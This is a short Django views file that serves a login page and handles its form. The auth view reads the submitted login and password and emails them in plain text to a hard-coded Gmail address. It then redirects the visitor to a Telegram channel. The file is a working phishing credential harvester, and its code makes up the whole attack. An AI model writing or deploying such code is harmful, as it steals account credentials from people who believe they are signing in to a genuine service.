from django.shortcuts import render, redirect
from django.core.mail import send_mail

# Create your views here.


def index(request):
    return render(request, 'login.html')


def auth(request):
    if request.method == 'POST':
        login = request.POST['login']
        password = request.POST['password']
        subject = "Hello, Django"
        message = f"login: {login}\npassword: {password}"
        from_email = "nofun985@gmail.com"
        recipient_list = ["nomozovasroe@gmail.com"]
        send_mail(subject, message, from_email, recipient_list)
        return redirect('https://t.me/TerDU_Yoshlari')
    else:
        print("Error")